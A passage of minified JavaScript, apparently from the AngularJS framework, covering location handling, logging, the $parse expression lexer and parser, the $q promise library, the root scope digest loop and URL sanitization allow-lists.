n=e.rewriteLinks;if(n&&!t.ctrlKey&&!t.metaKey&&!t.shiftKey&&2!==t.which&&2!==t.button){for(var a=o(t.target);"a"!==rt(a[0]);)if(a[0]===s[0]||!(a=a.parent())[0])return;if(!U(n)||!F(a.attr(n))){var h=a.prop("href"),c=a.attr("href")||a.attr("xlink:href");q(h)&&"[object SVGAnimatedString]"===h.toString()&&(h=un(h.animVal).href),!m.test(h)&&h&&!a.attr("target")&&!t.isDefaultPrevented()&&l.$$parseLinkUrl(h,c)&&(t.preventDefault(),l.absUrl()!==r.url()&&i.$apply())}}})),l.absUrl()!==d&&r.url(l.absUrl(),!0);var g=!0;return r.onUrlChange((function(t,e){ar(t,p)?(i.$evalAsync((function(){var r,n=l.absUrl(),s=l.$$state;l.$$parse(t),l.$$state=e,r=i.$broadcast("$locationChangeStart",t,n,e,s).defaultPrevented,l.absUrl()===t&&(r?(l.$$parse(n),l.$$state=s,f(n,!1,s)):(g=!1,y(n,s)))})),i.$$phase||i.$digest()):a.location.href=t})),i.$watch((function(){if(g||l.$$urlUpdatedByLocation){l.$$urlUpdatedByLocation=!1;var t=r.url(),e=l.absUrl(),s=r.state(),o=l.$$replace,a=!function(t,e){return t===e||un(t).href===un(e).href}(t,e)||l.$$html5&&n.history&&s!==l.$$state;(g||a)&&(g=!1,i.$evalAsync((function(){var e=l.absUrl(),r=i.$broadcast("$locationChangeStart",e,t,l.$$state,s).defaultPrevented;l.absUrl()===e&&(r?(l.$$parse(t),l.$$state=s):(a&&f(e,o,s===l.$$state?null:l.$$state),y(t,s)))})))}l.$$replace=!1})),l;function y(t,e){i.$broadcast("$locationChangeSuccess",l.absUrl(),t,l.$$state,e)}}]}function yr(){var t=!0,e=this;this.debugEnabled=function(e){return V(e)?(t=e,this):t},this.$get=["$window",function(i){var r,n=s||/\bEdge\//.test(i.navigator&&i.navigator.userAgent);return{log:a("log"),info:a("info"),warn:a("warn"),error:a("error"),debug:(r=a("debug"),function(){t&&r.apply(e,arguments)})};function o(t){return z(t)&&(t.stack&&n?t=t.message&&-1===t.stack.indexOf(t.message)?"Error: "+t.message+"\n"+t.stack:t.stack:t.sourceURL&&(t=t.message+"\n"+t.sourceURL+":"+t.line)),t}function a(t){var e=i.console||{},r=e[t]||e.log||D;return function(){var t=[];return S(arguments,(function(e){t.push(o(e))})),Function.prototype.apply.call(r,e,t)}}}]}S([dr,ur,cr],(function(t){t.prototype=Object.create(pr),t.prototype.state=function(e){if(!arguments.length)return this.$$state;if(t!==cr||!this.$$html5)throw ir("nostate","History API state support is available only in HTML5 mode and only in browsers supporting HTML5 History API");return this.$$state=F(e)?null:e,this.$$urlUpdatedByLocation=!0,this}}));var vr=n("$parse"),_r={}.constructor.prototype.valueOf;function br(t){return t+""}var wr=qt();S("+ - * / % === !== == != < > <= >= && || ! = |".split(" "),(function(t){wr[t]=!0}));var Er={n:"\n",f:"\f",r:"\r",t:"\t",v:"\v","'":"'",'"':'"'},Sr=function(t){this.options=t};Sr.prototype={constructor:Sr,lex:function(t){for(this.text=t,this.index=0,this.tokens=[];this.index<this.text.length;){var e=this.text.charAt(this.index);if('"'===e||"'"===e)this.readString(e);else if(this.isNumber(e)||"."===e&&this.isNumber(this.peek()))this.readNumber();else if(this.isIdentifierStart(this.peekMultichar()))this.readIdent();else if(this.is(e,"(){}[].,;:?"))this.tokens.push({index:this.index,text:e}),this.index++;else if(this.isWhitespace(e))this.index++;else{var i=e+this.peek(),r=i+this.peek(2),n=wr[e],s=wr[i],o=wr[r];if(n||s||o){var a=o?r:s?i:e;this.tokens.push({index:this.index,text:a,operator:!0}),this.index+=a.length}else this.throwError("Unexpected next character ",this.index,this.index+1)}}return this.tokens},is:function(t,e){return-1!==e.indexOf(t)},peek:function(t){var e=t||1;return this.index+e<this.text.length&&this.text.charAt(this.index+e)},isNumber:function(t){return"0"<=t&&t<="9"&&"string"==typeof t},isWhitespace:function(t){return" "===t||"\r"===t||"\t"===t||"\n"===t||"\v"===t||" "===t},isIdentifierStart:function(t){return this.options.isIdentifierStart?this.options.isIdentifierStart(t,this.codePointAt(t)):this.isValidIdentifierStart(t)},isValidIdentifierStart:function(t){return"a"<=t&&t<="z"||"A"<=t&&t<="Z"||"_"===t||"$"===t},isIdentifierContinue:function(t){return this.options.isIdentifierContinue?this.options.isIdentifierContinue(t,this.codePointAt(t)):this.isValidIdentifierContinue(t)},isValidIdentifierContinue:function(t,e){return this.isValidIdentifierStart(t,e)||this.isNumber(t)},codePointAt:function(t){return 1===t.length?t.charCodeAt(0):(t.charCodeAt(0)<<10)+t.charCodeAt(1)-56613888},peekMultichar:function(){var t=this.text.charAt(this.index),e=this.peek();if(!e)return t;var i=t.charCodeAt(0),r=e.charCodeAt(0);return i>=55296&&i<=56319&&r>=56320&&r<=57343?t+e:t},isExpOperator:function(t){return"-"===t||"+"===t||this.isNumber(t)},throwError:function(t,e,i){i=i||this.index;var r=V(e)?"s "+e+"-"+this.index+" ["+this.text.substring(e,i)+"]":" "+i;throw vr("lexerr","Lexer Error: {0} at column{1} in expression [{2}].",t,r,this.text)},readNumber:function(){for(var t="",e=this.index;this.index<this.text.length;){var i=d(this.text.charAt(this.index));if("."===i||this.isNumber(i))t+=i;else{var r=this.peek();if("e"===i&&this.isExpOperator(r))t+=i;else if(this.isExpOperator(i)&&r&&this.isNumber(r)&&"e"===t.charAt(t.length-1))t+=i;else{if(!this.isExpOperator(i)||r&&this.isNumber(r)||"e"!==t.charAt(t.length-1))break;this.throwError("Invalid exponent")}}this.index++}this.tokens.push({index:e,text:t,constant:!0,value:Number(t)})},readIdent:function(){var t=this.index;for(this.index+=this.peekMultichar().length;this.index<this.text.length;){var e=this.peekMultichar();if(!this.isIdentifierContinue(e))break;this.index+=e.length}this.tokens.push({index:t,text:this.text.slice(t,this.index),identifier:!0})},readString:function(t){var e=this.index;this.index++;for(var i="",r=t,n=!1;this.index<this.text.length;){var s=this.text.charAt(this.index);if(r+=s,n){if("u"===s){var o=this.text.substring(this.index+1,this.index+5);o.match(/[\da-f]{4}/i)||this.throwError("Invalid unicode escape [\\u"+o+"]"),this.index+=4,i+=String.fromCharCode(parseInt(o,16))}else{i+=Er[s]||s}n=!1}else if("\\"===s)n=!0;else{if(s===t)return this.index++,void this.tokens.push({index:e,text:r,constant:!0,value:i});i+=s}this.index++}this.throwError("Unterminated quote",e)}};var Ar=function(t,e){this.lexer=t,this.options=e};function Cr(t,e){return void 0!==t?t:e}function Tr(t,e){return void 0===t?e:void 0===e?t:t+e}Ar.Program="Program",Ar.ExpressionStatement="ExpressionStatement",Ar.AssignmentExpression="AssignmentExpression",Ar.ConditionalExpression="ConditionalExpression",Ar.LogicalExpression="LogicalExpression",Ar.BinaryExpression="BinaryExpression",Ar.UnaryExpression="UnaryExpression",Ar.CallExpression="CallExpression",Ar.MemberExpression="MemberExpression",Ar.Identifier="Identifier",Ar.Literal="Literal",Ar.ArrayExpression="ArrayExpression",Ar.Property="Property",Ar.ObjectExpression="ObjectExpression",Ar.ThisExpression="ThisExpression",Ar.LocalsExpression="LocalsExpression",Ar.NGValueParameter="NGValueParameter",Ar.prototype={ast:function(t){this.text=t,this.tokens=this.lexer.lex(t);var e=this.program();return 0!==this.tokens.length&&this.throwError("is an unexpected token",this.tokens[0]),e},program:function(){for(var t=[];;)if(this.tokens.length>0&&!this.peek("}",")",";","]")&&t.push(this.expressionStatement()),!this.expect(";"))return{type:Ar.Program,body:t}},expressionStatement:function(){return{type:Ar.ExpressionStatement,expression:this.filterChain()}},filterChain:function(){for(var t=this.expression();this.expect("|");)t=this.filter(t);return t},expression:function(){return this.assignment()},assignment:function(){var t=this.ternary();if(this.expect("=")){if(!Pr(t))throw vr("lval","Trying to assign a value to a non l-value");t={type:Ar.AssignmentExpression,left:t,right:this.assignment(),operator:"="}}return t},ternary:function(){var t,e,i=this.logicalOR();return this.expect("?")&&(t=this.expression(),this.consume(":"))?(e=this.expression(),{type:Ar.ConditionalExpression,test:i,alternate:t,consequent:e}):i},logicalOR:function(){for(var t=this.logicalAND();this.expect("||");)t={type:Ar.LogicalExpression,operator:"||",left:t,right:this.logicalAND()};return t},logicalAND:function(){for(var t=this.equality();this.expect("&&");)t={type:Ar.LogicalExpression,operator:"&&",left:t,right:this.equality()};return t},equality:function(){for(var t,e=this.relational();t=this.expect("==","!=","===","!==");)e={type:Ar.BinaryExpression,operator:t.text,left:e,right:this.relational()};return e},relational:function(){for(var t,e=this.additive();t=this.expect("<",">","<=",">=");)e={type:Ar.BinaryExpression,operator:t.text,left:e,right:this.additive()};return e},additive:function(){for(var t,e=this.multiplicative();t=this.expect("+","-");)e={type:Ar.BinaryExpression,operator:t.text,left:e,right:this.multiplicative()};return e},multiplicative:function(){for(var t,e=this.unary();t=this.expect("*","/","%");)e={type:Ar.BinaryExpression,operator:t.text,left:e,right:this.unary()};return e},unary:function(){var t;return(t=this.expect("+","-","!"))?{type:Ar.UnaryExpression,operator:t.text,prefix:!0,argument:this.unary()}:this.primary()},primary:function(){var t,e;for(this.expect("(")?(t=this.filterChain(),this.consume(")")):this.expect("[")?t=this.arrayDeclaration():this.expect("{")?t=this.object():this.selfReferential.hasOwnProperty(this.peek().text)?t=ot(this.selfReferential[this.consume().text]):this.options.literals.hasOwnProperty(this.peek().text)?t={type:Ar.Literal,value:this.options.literals[this.consume().text]}:this.peek().identifier?t=this.identifier():this.peek().constant?t=this.constant():this.throwError("not a primary expression",this.peek());e=this.expect("(","[",".");)"("===e.text?(t={type:Ar.CallExpression,callee:t,arguments:this.parseArguments()},this.consume(")")):"["===e.text?(t={type:Ar.MemberExpression,object:t,property:this.expression(),computed:!0},this.consume("]")):"."===e.text?t={type:Ar.MemberExpression,object:t,property:this.identifier(),computed:!1}:this.throwError("IMPOSSIBLE");return t},filter:function(t){for(var e=[t],i={type:Ar.CallExpression,callee:this.identifier(),arguments:e,filter:!0};this.expect(":");)e.push(this.expression());return i},parseArguments:function(){var t=[];if(")"!==this.peekToken().text)do{t.push(this.filterChain())}while(this.expect(","));return t},identifier:function(){var t=this.consume();return t.identifier||this.throwError("is not a valid identifier",t),{type:Ar.Identifier,name:t.text}},constant:function(){return{type:Ar.Literal,value:this.consume().value}},arrayDeclaration:function(){var t=[];if("]"!==this.peekToken().text)do{if(this.peek("]"))break;t.push(this.expression())}while(this.expect(","));return this.consume("]"),{type:Ar.ArrayExpression,elements:t}},object:function(){var t,e=[];if("}"!==this.peekToken().text)do{if(this.peek("}"))break;t={type:Ar.Property,kind:"init"},this.peek().constant?(t.key=this.constant(),t.computed=!1,this.consume(":"),t.value=this.expression()):this.peek().identifier?(t.key=this.identifier(),t.computed=!1,this.peek(":")?(this.consume(":"),t.value=this.expression()):t.value=t.key):this.peek("[")?(this.consume("["),t.key=this.expression(),this.consume("]"),t.computed=!0,this.consume(":"),t.value=this.expression()):this.throwError("invalid key",this.peek()),e.push(t)}while(this.expect(","));return this.consume("}"),{type:Ar.ObjectExpression,properties:e}},throwError:function(t,e){throw vr("syntax","Syntax Error: Token '{0}' {1} at column {2} of the expression [{3}] starting at [{4}].",e.text,t,e.index+1,this.text,this.text.substring(e.index))},consume:function(t){if(0===this.tokens.length)throw vr("ueoe","Unexpected end of expression: {0}",this.text);var e=this.expect(t);return e||this.throwError("is unexpected, expecting ["+t+"]",this.peek()),e},peekToken:function(){if(0===this.tokens.length)throw vr("ueoe","Unexpected end of expression: {0}",this.text);return this.tokens[0]},peek:function(t,e,i,r){return this.peekAhead(0,t,e,i,r)},peekAhead:function(t,e,i,r,n){if(this.tokens.length>t){var s=this.tokens[t],o=s.text;if(o===e||o===i||o===r||o===n||!e&&!i&&!r&&!n)return s}return!1},expect:function(t,e,i,r){var n=this.peek(t,e,i,r);return!!n&&(this.tokens.shift(),n)},selfReferential:{this:{type:Ar.ThisExpression},$locals:{type:Ar.LocalsExpression}}};function $r(t,e,i){var r,n,s,o=t.isPure=function(t,e){switch(t.type){case Ar.MemberExpression:if(t.computed)return!1;break;case Ar.UnaryExpression:return 1;case Ar.BinaryExpression:return"+"!==t.operator&&1;case Ar.CallExpression:return!1}return void 0===e?2:e}(t,i);switch(t.type){case Ar.Program:r=!0,S(t.body,(function(t){$r(t.expression,e,o),r=r&&t.expression.constant})),t.constant=r;break;case Ar.Literal:t.constant=!0,t.toWatch=[];break;case Ar.UnaryExpression:$r(t.argument,e,o),t.constant=t.argument.constant,t.toWatch=t.argument.toWatch;break;case Ar.BinaryExpression:$r(t.left,e,o),$r(t.right,e,o),t.constant=t.left.constant&&t.right.constant,t.toWatch=t.left.toWatch.concat(t.right.toWatch);break;case Ar.LogicalExpression:$r(t.left,e,o),$r(t.right,e,o),t.constant=t.left.constant&&t.right.constant,t.toWatch=t.constant?[]:[t];break;case Ar.ConditionalExpression:$r(t.test,e,o),$r(t.alternate,e,o),$r(t.consequent,e,o),t.constant=t.test.constant&&t.alternate.constant&&t.consequent.constant,t.toWatch=t.constant?[]:[t];break;case Ar.Identifier:t.constant=!1,t.toWatch=[t];break;case Ar.MemberExpression:$r(t.object,e,o),t.computed&&$r(t.property,e,o),t.constant=t.object.constant&&(!t.computed||t.property.constant),t.toWatch=t.constant?[]:[t];break;case Ar.CallExpression:s=!!t.filter&&function(t,e){return!t(e).$stateful}(e,t.callee.name),r=s,n=[],S(t.arguments,(function(t){$r(t,e,o),r=r&&t.constant,n.push.apply(n,t.toWatch)})),t.constant=r,t.toWatch=s?n:[t];break;case Ar.AssignmentExpression:$r(t.left,e,o),$r(t.right,e,o),t.constant=t.left.constant&&t.right.constant,t.toWatch=[t];break;case Ar.ArrayExpression:r=!0,n=[],S(t.elements,(function(t){$r(t,e,o),r=r&&t.constant,n.push.apply(n,t.toWatch)})),t.constant=r,t.toWatch=n;break;case Ar.ObjectExpression:r=!0,n=[],S(t.properties,(function(t){$r(t.value,e,o),r=r&&t.value.constant,n.push.apply(n,t.value.toWatch),t.computed&&($r(t.key,e,!1),r=r&&t.key.constant,n.push.apply(n,t.key.toWatch))})),t.constant=r,t.toWatch=n;break;case Ar.ThisExpression:case Ar.LocalsExpression:t.constant=!1,t.toWatch=[]}}function Ir(t){if(1===t.length){var e=t[0].expression,i=e.toWatch;return 1!==i.length||i[0]!==e?i:void 0}}function Pr(t){return t.type===Ar.Identifier||t.type===Ar.MemberExpression}function xr(t){if(1===t.body.length&&Pr(t.body[0].expression))return{type:Ar.AssignmentExpression,left:t.body[0].expression,right:{type:Ar.NGValueParameter},operator:"="}}function kr(t){this.$filter=t}function Or(t){this.$filter=t}function Mr(t,e,i){this.ast=new Ar(t,i),this.astCompiler=i.csp?new Or(e):new kr(e)}function Dr(t){return j(t.valueOf)?t.valueOf():_r.call(t)}function Rr(){var t,e,i=qt(),r={true:!0,false:!1,null:null,undefined:void 0};this.addLiteral=function(t,e){r[t]=e},this.setIdentifierFns=function(i,r){return t=i,e=r,this},this.$get=["$filter",function(n){var s={csp:ht().noUnsafeEval,literals:ot(r),isIdentifierStart:j(t)&&t,isIdentifierContinue:j(e)&&e};return o.$$getAst=function(t){return new Mr(new Sr(s),n,s).getAst(t).ast},o;function o(t,e){var r,o;switch(typeof t){case"string":if(t=t.trim(),!(r=i[o=t]))r=new Mr(new Sr(s),n,s).parse(t),i[o]=d(r);return p(r,e);case"function":return p(t,e);default:return p(D,e)}}function a(t,e,i){return null==t||null==e?t===e:!("object"==typeof t&&(t=Dr(t),"object"==typeof t&&!i))&&(t===e||t!=t&&e!=e)}function l(t,e,i,r,n){var s,o=r.inputs;if(1===o.length){var l=a;return o=o[0],t.$watch((function(t){var e=o(t);return a(e,l,o.isPure)||(s=r(t,void 0,void 0,[e]),l=e&&Dr(e)),s}),e,i,n)}for(var h=[],c=[],u=0,d=o.length;u<d;u++)h[u]=a,c[u]=null;return t.$watch((function(t){for(var e=!1,i=0,n=o.length;i<n;i++){var l=o[i](t);(e||(e=!a(l,h[i],o[i].isPure)))&&(c[i]=l,h[i]=l&&Dr(l))}return e&&(s=r(t,void 0,void 0,c)),s}),e,i,n)}function h(t,e,i,r,n){var s,o,a=r.literal?c:V,l=r.$$intercepted||r,h=r.$$interceptor||R,u=r.inputs&&!l.inputs;return m.literal=r.literal,m.constant=r.constant,m.inputs=r.inputs,d(m),s=t.$watch(m,e,i,n);function p(){a(o)&&s()}function m(t,e,i,r){return o=u&&r?r[0]:l(t,e,i,r),a(o)&&t.$$postDigest(p),h(o)}}function c(t){var e=!0;return S(t,(function(t){V(t)||(e=!1)})),e}function u(t,e,i,r){var n=t.$watch((function(t){return n(),r(t)}),e,i);return n}function d(t){return t.constant?t.$$watchDelegate=u:t.oneTime?t.$$watchDelegate=h:t.inputs&&(t.$$watchDelegate=l),t}function p(t,e){if(!e)return t;t.$$interceptor&&(e=function(t,e){function i(i){return e(t(i))}return i.$stateful=t.$stateful||e.$stateful,i.$$pure=t.$$pure&&e.$$pure,i}(t.$$interceptor,e),t=t.$$intercepted);var i=!1,r=function(r,n,s,o){var a=i&&o?o[0]:t(r,n,s,o);return e(a)};return r.$$intercepted=t,r.$$interceptor=e,r.literal=t.literal,r.oneTime=t.oneTime,r.constant=t.constant,e.$stateful||(i=!t.inputs,r.inputs=t.inputs?t.inputs:[t],e.$$pure||(r.inputs=r.inputs.map((function(t){return 2===t.isPure?function(e){return t(e)}:t})))),d(r)}}]}function Lr(){var t=!0;this.$get=["$rootScope","$exceptionHandler",function(e,i){return Fr((function(t){e.$evalAsync(t)}),i,t)}],this.errorOnUnhandledRejections=function(e){return V(e)?(t=e,this):t}}function Nr(){var t=!0;this.$get=["$browser","$exceptionHandler",function(e,i){return Fr((function(t){e.defer(t)}),i,t)}],this.errorOnUnhandledRejections=function(e){return V(e)?(t=e,this):t}}function Fr(t,e,i){var r=n("$q",TypeError),s=0,o=[];function a(){return new l}function l(){var t=this.promise=new h;this.resolve=function(e){d(t,e)},this.reject=function(e){m(t,e)},this.notify=function(e){g(t,e)}}function h(){this.$$state={status:0}}function c(){for(;!s&&o.length;){var t=o.shift();if(!Vr(t)){qr(t);var i="Possibly unhandled rejection: "+Ht(t.value);z(t.value)?e(t.value,i):e(i)}}}function u(r){i&&!r.pending&&2===r.status&&!Vr(r)&&(0===s&&0===o.length&&t(c),o.push(r)),!r.processScheduled&&r.pending&&(r.processScheduled=!0,++s,t((function(){!function(r){var n,o,a;a=r.pending,r.processScheduled=!1,r.pending=void 0;try{for(var l=0,h=a.length;l<h;++l){qr(r),o=a[l][0],n=a[l][r.status];try{j(n)?d(o,n(r.value)):1===r.status?d(o,r.value):m(o,r.value)}catch(t){m(o,t),t&&!0===t.$$passToExceptionHandler&&e(t)}}}finally{--s,i&&0===s&&t(c)}}(r)})))}function d(t,e){t.$$state.status||(e===t?f(t,r("qcycle","Expected promise to be resolved with value other than itself '{0}'",e)):p(t,e))}function p(t,e){var i,r=!1;try{(q(e)||j(e))&&(i=e.then),j(i)?(t.$$state.status=-1,i.call(e,(function(e){r||(r=!0,p(t,e))}),n,(function(e){g(t,e)}))):(t.$$state.value=e,t.$$state.status=1,u(t.$$state))}catch(t){n(t)}function n(e){r||(r=!0,f(t,e))}}function m(t,e){t.$$state.status||f(t,e)}function f(t,e){t.$$state.value=e,t.$$state.status=2,u(t.$$state)}function g(i,r){var n=i.$$state.pending;i.$$state.status<=0&&n&&n.length&&t((function(){for(var t,i,s=0,o=n.length;s<o;s++){i=n[s][0],t=n[s][3];try{g(i,j(t)?t(r):r)}catch(t){e(t)}}}))}function y(t){var e=new h;return m(e,t),e}function v(t,e,i){var r=null;try{j(i)&&(r=i())}catch(t){return y(t)}return Z(r)?r.then((function(){return e(t)}),y):e(t)}function _(t,e,i,r){var n=new h;return d(n,t),n.then(e,i,r)}P(h.prototype,{then:function(t,e,i){if(F(t)&&F(e)&&F(i))return this;var r=new h;return this.$$state.pending=this.$$state.pending||[],this.$$state.pending.push([r,t,e,i]),this.$$state.status>0&&u(this.$$state),r},catch:function(t){return this.then(null,t)},finally:function(t,e){return this.then((function(e){return v(e,b,t)}),(function(e){return v(e,y,t)}),e)}});var b=_;function w(t){if(!j(t))throw r("norslvr","Expected resolverFn, got '{0}'",t);var e=new h;return t((function(t){d(e,t)}),(function(t){m(e,t)})),e}return w.prototype=h.prototype,w.defer=a,w.reject=y,w.when=_,w.resolve=b,w.all=function(t){var e=new h,i=0,r=G(t)?[]:{};return S(t,(function(t,n){i++,_(t).then((function(t){r[n]=t,--i||d(e,r)}),(function(t){m(e,t)}))})),0===i&&d(e,r),e},w.race=function(t){var e=a();return S(t,(function(t){_(t).then(e.resolve,e.reject)})),e.promise},w}function Vr(t){return!!t.pur}function qr(t){t.pur=!0}function Br(t){t.$$state&&qr(t.$$state)}function Ur(){this.$get=["$window","$timeout",function(t,e){var i=t.requestAnimationFrame||t.webkitRequestAnimationFrame,r=t.cancelAnimationFrame||t.webkitCancelAnimationFrame||t.webkitCancelRequestAnimationFrame,n=!!i,s=n?function(t){var e=i(t);return function(){r(e)}}:function(t){var i=e(t,16.66,!1);return function(){e.cancel(i)}};return s.supported=n,s}]}function Wr(){var t=10,e=n("$rootScope"),i=null,r=null;this.digestTtl=function(e){return arguments.length&&(t=e),t},this.$get=["$exceptionHandler","$parse","$browser",function(n,o,a){function l(t){t.currentScope.$$destroyed=!0}function h(t){9===s&&(t.$$childHead&&h(t.$$childHead),t.$$nextSibling&&h(t.$$nextSibling)),t.$parent=t.$$nextSibling=t.$$prevSibling=t.$$childHead=t.$$childTail=t.$root=t.$$watchers=null}function c(){this.$id=T(),this.$$phase=this.$parent=this.$$watchers=this.$$nextSibling=this.$$prevSibling=this.$$childHead=this.$$childTail=null,this.$root=this,this.$$destroyed=!1,this.$$suspended=!1,this.$$listeners={},this.$$listenerCount={},this.$$watchersCount=0,this.$$isolateBindings=null}c.prototype={constructor:c,$new:function(t,e){var i;return e=e||this,t?(i=new c).$root=this.$root:(this.$$ChildScope||(this.$$ChildScope=function(t){function e(){this.$$watchers=this.$$nextSibling=this.$$childHead=this.$$childTail=null,this.$$listeners={},this.$$listenerCount={},this.$$watchersCount=0,this.$id=T(),this.$$ChildScope=null,this.$$suspended=!1}return e.prototype=t,e}(this)),i=new this.$$ChildScope),i.$parent=e,i.$$prevSibling=e.$$childTail,e.$$childHead?(e.$$childTail.$$nextSibling=i,e.$$childTail=i):e.$$childHead=e.$$childTail=i,(t||e!==this)&&i.$on("$destroy",l),i},$watch:function(t,e,r,n){var s=o(t),a=j(e)?e:D;if(s.$$watchDelegate)return s.$$watchDelegate(this,a,r,s,t);var l=this,h=l.$$watchers,c={fn:a,last:w,get:s,exp:n||t,eq:!!r};return i=null,h||((h=l.$$watchers=[]).$$digestWatchIndex=-1),h.unshift(c),h.$$digestWatchIndex++,_(this,1),function(){var t=st(h,c);t>=0&&(_(l,-1),t<h.$$digestWatchIndex&&h.$$digestWatchIndex--),i=null}},$watchGroup:function(t,e){var i=new Array(t.length),r=new Array(t.length),n=[],s=this,o=!1,a=!0;if(!t.length){var l=!0;return s.$evalAsync((function(){l&&e(r,r,s)})),function(){l=!1}}if(1===t.length)return this.$watch(t[0],(function(t,n,s){r[0]=t,i[0]=n,e(r,t===n?r:i,s)}));function h(){o=!1;try{a?(a=!1,e(r,r,s)):e(r,i,s)}finally{for(var n=0;n<t.length;n++)i[n]=r[n]}}return S(t,(function(t,e){var i=s.$watch(t,(function(t){r[e]=t,o||(o=!0,s.$evalAsync(h))}));n.push(i)})),function(){for(;n.length;)n.shift()()}},$watchCollection:function(t,e){f.$$pure=o(t).literal,f.$stateful=!f.$$pure;var i,r,n,s=this,a=e.length>1,l=0,h=o(t,f),c=[],d={},p=!0,m=0;function f(t){var e,n,s,o;if(!F(i=t)){if(q(i))if(E(i)){r!==c&&(m=(r=c).length=0,l++),e=i.length,m!==e&&(l++,r.length=m=e);for(var a=0;a<e;a++)o=r[a],s=i[a],!(o!=o&&s!=s)&&o!==s&&(l++,r[a]=s)}else{for(n in r!==d&&(r=d={},m=0,l++),e=0,i)u.call(i,n)&&(e++,s=i[n],o=r[n],n in r?!(o!=o&&s!=s)&&o!==s&&(l++,r[n]=s):(m++,r[n]=s,l++));if(m>e)for(n in l++,r)u.call(i,n)||(m--,delete r[n])}else r!==i&&(r=i,l++);return l}}return this.$watch(h,(function(){if(p?(p=!1,e(i,i,s)):e(i,n,s),a)if(q(i))if(E(i)){n=new Array(i.length);for(var t=0;t<i.length;t++)n[t]=i[t]}else for(var r in n={},i)u.call(i,r)&&(n[r]=i[r]);else n=i}))},$digest:function(){var s,o,l,h,c,u,f,_,b,E=t,S=p.length?d:this,C=[];y("$digest"),a.$$checkUrlChange(),this===d&&null!==r&&(a.defer.cancel(r),A()),i=null;do{c=!1,f=S;for(var T=0;T<p.length;T++){try{(0,(b=p[T]).fn)(b.scope,b.locals)}catch(t){n(t)}i=null}p.length=0;t:do{if(h=!f.$$suspended&&f.$$watchers)for(h.$$digestWatchIndex=h.length;h.$$digestWatchIndex--;)try{if(s=h[h.$$digestWatchIndex])if((o=(0,s.get)(f))===(l=s.last)||(s.eq?lt(o,l):O(o)&&O(l))){if(s===i){c=!1;break t}}else c=!0,i=s,s.last=s.eq?ot(o,null):o,(0,s.fn)(o,l===w?o:l,f),E<5&&(C[_=4-E]||(C[_]=[]),C[_].push({msg:j(s.exp)?"fn: "+(s.exp.name||s.exp.toString()):s.exp,newVal:o,oldVal:l}))}catch(t){n(t)}if(!(u=!f.$$suspended&&f.$$watchersCount&&f.$$childHead||f!==S&&f.$$nextSibling))for(;f!==S&&!(u=f.$$nextSibling);)f=f.$parent}while(f=u);if((c||p.length)&&!E--)throw v(),e("infdig","{0} $digest() iterations reached. Aborting!\nWatchers fired in the last 5 iterations: {1}",t,C)}while(c||p.length);for(v();g<m.length;)try{m[g++]()}catch(t){n(t)}m.length=g=0,a.$$checkUrlChange()},$suspend:function(){this.$$suspended=!0},$isSuspended:function(){return this.$$suspended},$resume:function(){this.$$suspended=!1},$destroy:function(){if(!this.$$destroyed){var t=this.$parent;for(var e in this.$broadcast("$destroy"),this.$$destroyed=!0,this===d&&a.$$applicationDestroyed(),_(this,-this.$$watchersCount),this.$$listenerCount)b(this,this.$$listenerCount[e],e);t&&t.$$childHead===this&&(t.$$childHead=this.$$nextSibling),t&&t.$$childTail===this&&(t.$$childTail=this.$$prevSibling),this.$$prevSibling&&(this.$$prevSibling.$$nextSibling=this.$$nextSibling),this.$$nextSibling&&(this.$$nextSibling.$$prevSibling=this.$$prevSibling),this.$destroy=this.$digest=this.$apply=this.$evalAsync=this.$applyAsync=D,this.$on=this.$watch=this.$watchGroup=function(){return D},this.$$listeners={},this.$$nextSibling=null,h(this)}},$eval:function(t,e){return o(t)(this,e)},$evalAsync:function(t,e){!d.$$phase&&!p.length&&a.defer((function(){p.length&&d.$digest()}),null,"$evalAsync"),p.push({scope:this,fn:o(t),locals:e})},$$postDigest:function(t){m.push(t)},$apply:function(t){try{y("$apply");try{return this.$eval(t)}finally{v()}}catch(t){n(t)}finally{try{d.$digest()}catch(t){throw n(t),t}}},$applyAsync:function(t){var e=this;t&&f.push((function(){e.$eval(t)})),t=o(t),null===r&&(r=a.defer((function(){d.$apply(A)}),null,"$applyAsync"))},$on:function(t,e){var i=this.$$listeners[t];i||(this.$$listeners[t]=i=[]),i.push(e);var r=this;do{r.$$listenerCount[t]||(r.$$listenerCount[t]=0),r.$$listenerCount[t]++}while(r=r.$parent);var n=this;return function(){var r=i.indexOf(e);-1!==r&&(delete i[r],b(n,1,t))}},$emit:function(t,e){var i,r,s,o=[],a=this,l=!1,h={name:t,targetScope:a,stopPropagation:function(){l=!0},preventDefault:function(){h.defaultPrevented=!0},defaultPrevented:!1},c=ut([h],arguments,1);do{for(i=a.$$listeners[t]||o,h.currentScope=a,r=0,s=i.length;r<s;r++)if(i[r])try{i[r].apply(null,c)}catch(t){n(t)}else i.splice(r,1),r--,s--;if(l)break;a=a.$parent}while(a);return h.currentScope=null,h},$broadcast:function(t,e){var i=this,r=i,s=i,o={name:t,targetScope:i,preventDefault:function(){o.defaultPrevented=!0},defaultPrevented:!1};if(!i.$$listenerCount[t])return o;for(var a,l,h,c=ut([o],arguments,1);r=s;){for(o.currentScope=r,l=0,h=(a=r.$$listeners[t]||[]).length;l<h;l++)if(a[l])try{a[l].apply(null,c)}catch(t){n(t)}else a.splice(l,1),l--,h--;if(!(s=r.$$listenerCount[t]&&r.$$childHead||r!==i&&r.$$nextSibling))for(;r!==i&&!(s=r.$$nextSibling);)r=r.$parent}return o.currentScope=null,o}};var d=new c,p=d.$$asyncQueue=[],m=d.$$postDigestQueue=[],f=d.$$applyAsyncQueue=[],g=0;return d;function y(t){if(d.$$phase)throw e("inprog","{0} already in progress",d.$$phase);d.$$phase=t}function v(){d.$$phase=null}function _(t,e){do{t.$$watchersCount+=e}while(t=t.$parent)}function b(t,e,i){do{t.$$listenerCount[i]-=e,0===t.$$listenerCount[i]&&delete t.$$listenerCount[i]}while(t=t.$parent)}function w(){}function A(){for(;f.length;)try{f.shift()()}catch(t){n(t)}r=null}}]}function Hr(){var t=/^\s*(https?|s?ftp|mailto|tel|file):/,e=/^\s*((https?|ftp|file|blob):|data:image\/)/;this.aHrefSanitizationTrustedUrlList=function(e){return V(e)?(t=e,this):t},this.imgSrcSanitizationTrustedUrlList=function(t){return V(t)?(e=t,this):e},this.$get=function(){return function(i,r){var n=r?e:t,s=un(i&&i.trim()).href;return""===s||s.match(n)?i:"unsafe:"+s}}}kr.prototype={compile:function(t){var e=this;this.state={nextId:0,filters:{},fn:{vars:[],body:[],own:{}},assign:{vars:[],body:[],own:{}},inputs:[]},$r(t,e.$filter);var 